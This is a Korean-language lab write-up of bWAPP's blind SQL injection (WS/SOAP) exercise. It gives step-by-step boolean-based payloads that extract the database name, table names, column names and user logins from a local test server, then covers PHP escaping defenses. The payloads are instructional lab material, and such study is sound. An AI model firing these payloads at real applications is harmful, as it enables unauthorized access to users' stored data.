---
title: "[bWAPP] 1. Injection - SQL Injection - Blind (WS/SOAP)"
---

<br>

## Injection

공격자가 신뢰할 수 없는 입력을 프로그램에 주입하도록 하는 공격.

<br>

<br>

## SQL Injection

응용 프로그램 보안 상의 허점을 의도적으로 이용해, 

임의의 SQL문을 주입하여 악의적인 SQL문을 실행하게 함으로써

DB를 비정상적으로 조작하는 코드 인젝션의 대표적인 공격.

이로인해 공격자가 DB에 저장되어 있는 다른 사용자의 개인 정보 등 허가되지 않은 정보에 접근하여,

데이터 변조 및 조작 가능.

<br>

<br>

## Blind Injection

Blind SQL Injection으로 많이 사용

SQL인젝션 공격에는 쿼리 조건을 무력화하여 인증을 우회하거나,쿼리 결과에 정보를 붙여서 데이터를 유출하거나 시스템 명령어를 삽입하는 형태로 공격이 진행

하지만, 공격하는 대상 웹페이지가 어떤 오류도 출력하지 않고 쿼리 겨로가 리스트도 제공하지 않는다면 

Blind SQL Injection으로 쿼리 결과의 참/거짓을 통해 DB 값 유출해 내는 기법

<br>

### WS/SOAP

SOAP : 일반적으로 널리 알려진 HTTP, HTTPS, SMTP 등을 통해 XML 기반의 메시지를 컴퓨터 네트워크 상에서 교환하는 프로토콜

![image-20220317033102972](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220317033102972.png)

![image-20220317034152786](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220317034152786.png)

- GET 방식으로 URL에 변수 노출하는 것 확인
- 작은 따옴표 넣어봐서 SQL 코드 유추해보자

![image-20220317034239335](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220317034239335.png)

- 변수에 작은 따옴표 하나 넣어보니 요런 메시지 뜬것을 알 수 있다.
- 항상 참인 구문을 넣어보자

<BR>

### 항상 참 구문

![image-20220317034351696](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220317034351696.png)

`http://172.30.1.25/bWAPP/sqli_5.php?title=%27%20or%201=1%20#&action=go`

- 그대로다.

### 거짓 구문

![image-20220317034441833](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220317034441833.png)

`http://172.30.1.25/bWAPP/sqli_5.php?title=%27%20or%201=0#&action=go`

- 미동도 없다.

  흠..

- 주석처리로 뒷 문들을 모두 무효시키기 때문에 SOAP가 적용되지 않는 것을 확인할 수 있다.

- 또한 현재 참 거짓 구문에서 주석을 뺴도 여전히 문제상황에 놓이는데 이는 유추해본 SQL문에서 알 수 있다.

`"select * from table where title %' " . %title . " '%";`

- 위와 같이 되어있다고 유추할 수 있는데 .%title. 에 변수 값이 들어가기 위해서는
- ' or 'a'='a로 앞의 작은 따옴표와 뒤의 작은 따옴표를 충족시켜줘야 하기 때문에 그렇다.

<BR>

### 다른 참 구문

![image-20220317035146643](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220317035146643.png)

`' or 'a'='a`

-  참 결과

### 다른 거짓 구문

![image-20220317035230788](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220317035230788.png)

`' or 'a'='b`

- 거짓 결과
- 이를 이용해 메타 정보를 긁어 모아보자

<br>

### DB 조회

![image-20220317035230788](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220317035230788.png)

`' or length(database())=1 and 'a'='a`

- 이런식으로 DB의 길이를 하나하나 참 거짓으로 대입해봐서 알아내주고

`' or ascii(substring(database(),1,1))>96 and 'a'='a`

- 다음으로 문자를 알아내야 하는데
- ascii 명령어를 통해 대문자인지 소문자인지를 먼저 구분해준다.

`' or substring(database(),1,1)='a' and 'a'='a`

- substring 명령어를 통해 database의 첫번쨰 위치의 길이 1값이 a가 맞는지 확인한다.

`SUBSTR(str, pos, len)`

- str에서 pos 번째 위치의 len개의 문자를 읽어 들임

<br>

### 테이블 조회

![image-20220317035230788](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220317035230788.png)

`' or length((select table_name from information_schema.tables where table_schema='bWAPP' limit 0,1))=1 and 'a'='a`

- 길이 구해주고

`' or ascii(substring((select table_name from information_schema.tables where table_schema='bWAPP' limit 0,1),1,1))>96 and 'a'='a`

- 대소문자 구분해준 후

`' or substring((select table_name from information_schema.tables where table_schema='bWAPP' limit 0,1), 1,1)='a' and 'a'='a`

- 문자 대조를 통해 테이블을 구해준다.

<br>

### 컬럼 조회

![image-20220317035230788](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220317035230788.png)

`' or length((select column_name from information_schema.columns where table_name='heroes' limit 0,1))=1 and 'a'='a`

- 길이

`' or ascii(substring((select column_name from information_schema.columns where table_name='heroes' limit 0,1),1,1))>96 and 'a'='a`

- 대소문자

`' or substring((select column_name from informaion_schema.columns where table_name='heroes' limit 0,1),1,1)='a' and 'a'='a`

- 대조..
- 힘내자.. 다왔다.

<br>

### 컬럼 속성

![image-20220317035230788](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220317035230788.png)

`' or length((select login from heroes limit 0,1))=1 and 'a'='a`

- 마찬가지로 길이

`' or ascii(substring((select login from heroes limit 0,1),1,1))>96 and 'a'='a`

- 대소문자..
- 쉽게 얻어지는 건 업따. 인생이 그러타.. 해킹도 마찬가지다.

`' or substring((select login from heroes limit 0,1),1,1)='a' and 'a'='a`

- 대조
- 고생했다.

<br>

<br>

## 대응방안

### Linux

![image-20220318002544545](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220318002544545.png)

![image-20220318002653266](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220318002653266.png)

- vi 편집기로 sqli_5.php 소스코드를 열어준다.
- level 1 : sqli_check_1 함수 사용
- level 2 : sqli_check_2 함수 사용

<br>

### functions_external.php

![image-20220317235926576](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220317235926576.png)

- addslashes : 특수 문자(',",/) 앞에 역슬래시를 삽입하여 특수문자 기능을 문자로 이스케이프하는 함수
  - 인코딩된 태그나 스크립트가 들어오면 바로 디코딩되기 때문에 보안 허점 발생
- mysql_real_escape_string : PHP에서 SQL Injection 공격 등을 방어하기 위하여 특수 문자열을 이스케이프 하기 위한 함수
  - `\x00, \n, \r, \, ', ", \x1a`와 같은 문자 앞에 `\`(역슬레시)를 붙여서 해당 문자가 실제 작동하지 않도록 이스케이프 해준다.
  - addslashes 보다 처리할 수 있는 문자들이 더 많음

